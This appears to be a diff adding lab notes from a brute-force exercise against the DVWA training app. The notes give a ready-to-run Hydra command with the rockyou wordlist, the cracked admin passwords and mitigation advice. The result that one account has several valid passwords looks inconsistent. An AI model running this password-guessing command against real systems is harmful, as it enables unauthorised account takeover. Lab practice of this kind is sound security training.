@@ -1,0 +1,32 @@
+Brute-Force Login Attack using Hydra - Lab Notes
+-------------------------------------------------
+
+Target: DVWA Login Page
+Tool: Hydra
+
+1. Command Used:
+   hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.64.5 http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^:Login failed"
+
+2. Wordlist:
+   rockyou.txt (default Kali Linux path)
+   - Decompressed using: sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+3. Result:
+   Hydra successfully found multiple valid passwords:
+   - admin:12345
+   - admin:password
+   - admin:iloveyou
+   - ...
+
+4. Conditions:
+   - DVWA Security Level: LOW
+   - CSRF Protection: Disabled
+
+5. Screenshot:
+   - Stored in `attacks/screenshots/hydra_success.png`
+
+6. Security Recommendation:
+   - Implement account lockout or delay after failed logins
+   - Use CAPTCHA or MFA
+   - Limit login attempts from same IP
+
